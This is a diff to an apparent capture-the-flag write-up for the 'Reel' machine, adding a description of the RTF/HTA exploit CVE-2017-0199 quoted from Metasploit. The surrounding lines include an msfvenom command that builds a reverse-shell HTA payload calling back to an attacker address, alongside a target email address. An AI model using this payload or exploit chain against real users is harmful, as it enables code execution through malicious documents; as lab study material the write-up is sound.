@@ -68,6 +68,9 @@ Failed to extract required information from <WEF.docx>!
 nico@megabank.com
 
 ### RTF cve
+At the time of Reel’s release, there was a popular RTF exploit that was being used very commonly in broad-based attacks, CVE-2017-0199. The Metasploit module description does a good job explaining it at a high level:
+
+Description: This module creates a malicious RTF file that when opened in vulnerable versions of Microsoft Word will lead to code execution. The flaw exists in how a olelink object can make a http(s) request, and execute hta code in response. This bug was originally seen being exploited in the wild starting in Oct 2016. This module was created by reversing a public malware sample.
 ##### without metasploit
 0) Prepare the HTA payload with msfvenom
 `msfvenom -p windows/shell_reverse_tcp LHOST=10.10.16.13 LPORT=443 -f hta-psh > /tmp/alvin.hta` <- x86 make it harder to think about it.
